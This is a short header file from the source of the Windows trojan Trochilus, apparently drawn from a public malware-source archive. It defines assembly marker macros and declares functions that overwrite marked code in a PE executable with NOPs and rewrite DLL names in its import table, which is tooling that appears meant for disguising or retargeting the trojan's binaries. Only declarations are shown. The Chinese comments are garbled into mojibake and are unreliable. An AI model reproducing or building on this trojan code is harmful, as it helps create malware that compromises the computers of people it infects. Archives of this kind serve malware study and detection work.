/*
  name      Trochilus
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
#pragma once

namespace PEUtils
{
#define CODE_MARK_BEGIN()	\
	_asm inc eax			\
 	_asm dec eax			
#define CODE_MARK_END()	\
 	_asm inc ebx		\
 	_asm dec ebx

	//����PE�ļ�����Σ�����CODE_MARK_BEGIN��ͷ����CODE_MARK_END��β�Ĵ��룬ȫ������ΪNOP
	//lpBaseΪPE�ļ���FileMapping�׵�ַ
	void CleanCode(LPVOID lpBase);

	//�滻PE�ļ���������е�dll���ƣ���ҪpTargetName���ַ����� >= pReplaceName���ַ�����
	//lpBaseΪPE�ļ���FileMapping�׵�ַ
	BOOL ReplaceIIDName(LPVOID lpBase, LPCSTR pTargetName, LPCSTR pReplaceName);
}
